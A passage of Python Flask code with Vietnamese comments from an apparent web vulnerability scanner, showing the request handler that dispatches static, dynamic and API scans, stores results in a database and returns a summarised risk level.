            "error": "URL phải là absolute URL (có http:// hoặc https://)"
        }), 400
    
    log_info(f"========== BẮT ĐẦU QUÉT ==========")
    log_info(f"URL: {url}")
    log_info(f"Category: {url_category}")
    
    # Thực hiện quét theo sơ đồ
    scan_results = {}
    
    # 1. STATIC HOLES - cho static URLs
    if "static" in scan_types and "static_url" in url_category:
        log_info(">>> Quét STATIC HOLES")
        scan_results["static_holes"] = scan_static_holes(url)
    
    # 2. DYNAMIC HOLES - cho dynamic URLs
    if "dynamic" in scan_types and "dynamic_url" in url_category:
        log_info(">>> Quét DYNAMIC HOLES")
        scan_results["dynamic_holes"] = scan_dynamic_holes(url)
    
    # 3. ABUSALY HOLES - cho abusaly URLs (API endpoints)
    if "abusaly" in scan_types and "abusaly_url" in url_category:
        log_info(">>> Quét ABUSALY HOLES")
        
        # Kiểm tra endpoint có chấp nhận JSON không
        accepts_json, status = detect_json_body(url)
        
        if accepts_json:
            log_info("Endpoint chấp nhận JSON body")
            scan_results["abusaly_holes"] = scan_abusaly_holes(url)
        else:
            scan_results["abusaly_holes"] = {
                "scan_type": "abusaly_holes",
                "info": "Endpoint không chấp nhận JSON body hoặc không phản hồi",
                "note": "Cần kiểm tra thủ công với authentication"
            }
    
    # Lưu vào database
    try:
        Task.objects(url=url).update_one(
            set__category=url_category,
            set__scan_results=scan_results,
            set__scanned_at=datetime.now(),
            upsert=True
        )
    except Exception as e:
        logging.error(f"Database error: {str(e)}")
        return jsonify({
            "error": f"Lỗi khi lưu vào database: {str(e)}"
        }), 500
    
    # Tổng hợp kết quả
    total_vulnerabilities = 0
    for scan_type, result in scan_results.items():
        if isinstance(result, dict) and "vulnerabilities" in result:
            total_vulnerabilities += len(result["vulnerabilities"])
    
    log_info(f"Tổng số lỗ hổng phát hiện: {total_vulnerabilities}")
    log_info(f"========== KẾT THÚC QUÉT ==========\n")
    
    return jsonify({
        "status": "success",
        "url": url,
        "category": url_category,
        "scans_performed": list(scan_results.keys()),
        "results": scan_results,
        "summary": {
            "total_vulnerabilities": total_vulnerabilities,
            "scan_timestamp": datetime.now().isoformat(),
            "risk_level": "CRITICAL" if total_vulnerabilities > 5 else "HIGH" if total_vulnerabilities > 2 else "MEDIUM" if total_vulnerabilities > 0 else "LOW"
        }
    })